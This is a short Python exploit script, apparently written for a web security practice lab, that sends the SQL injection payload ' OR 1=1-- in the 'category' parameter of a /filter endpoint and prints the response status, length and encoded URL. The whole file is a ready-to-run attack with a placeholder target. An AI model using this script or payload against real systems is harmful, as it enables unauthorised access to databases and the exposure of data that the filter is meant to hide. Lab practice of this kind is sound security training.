#!/usr/bin/env python3

import requests

# CHANGE THIS but keep /filter
TARGET = "YOUR.LAB.URL/filter"

def exploit_sqli():
    payload = "' OR 1=1--"

    print(f"[+] Payload: {payload}")

    response = requests.get(
        TARGET,
        params={"category": payload}  # 🔥 auto-encodes
    )

    print(f"[+] Status Code: {response.status_code}")
    print(f"[+] Length: {len(response.text)}")

    print(response.url)  # 👀 shows encoded URL

if __name__ == "__main__":
    exploit_sqli()